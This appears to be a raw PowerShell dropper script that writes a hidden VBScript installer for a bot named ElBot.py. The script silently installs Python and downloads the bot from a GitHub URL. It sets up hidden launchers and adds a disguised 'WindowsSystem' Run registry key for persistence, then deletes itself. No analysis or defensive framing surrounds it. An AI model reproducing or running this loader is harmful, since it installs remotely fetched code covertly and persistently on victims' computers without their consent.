$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell"): Set fso = CreateObject("Scripting.FileSystemObject"): botDir = "C:\Windows\Temp\SystemCache": If Not fso.FolderExists(botDir) Then fso.CreateFolder(botDir): WshShell.Run "cmd /c powershell -Command ""Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.7/python-3.11.7-amd64.exe' -OutFile 'C:\Windows\Temp\python-setup.exe'""", 0, True: WshShell.Run "cmd /c C:\Windows\Temp\python-setup.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0", 0, True: Wscript.Sleep 30000: WshShell.Run "cmd /c powershell -Command ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/kruzhanma/Hen/refs/heads/main/ElBot.py' -OutFile '" & botDir & "\ElBot.py'""", 0, True: Set batchFile = fso.CreateTextFile(botDir & "\launcher.bat", True): batchFile.WriteLine ""@echo off"": batchFile.WriteLine "cd /d " & botDir: batchFile.WriteLine "python ElBot.py": batchFile.Close: Set vbsFile = fso.CreateTextFile(botDir & "\hidden.vbs", True): vbsFile.WriteLine "Set WshShell = CreateObject(""WScript.Shell"")": vbsFile.WriteLine "WshShell.Run ""cmd /c launcher.bat"", 0, False": vbsFile.Close: WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSystem", "wscript.exe """ & botDir & "\hidden.vbs""", "REG_SZ": WshShell.Run "wscript.exe """ & botDir & "\hidden.vbs""", 0, False: fso.DeleteFile WScript.ScriptFullName
"@; $vbsContent | Out-File -FilePath "installer.vbs" -Encoding ASCII; Start-Process wscript -ArgumentList "installer.vbs" -WindowStyle Hidden
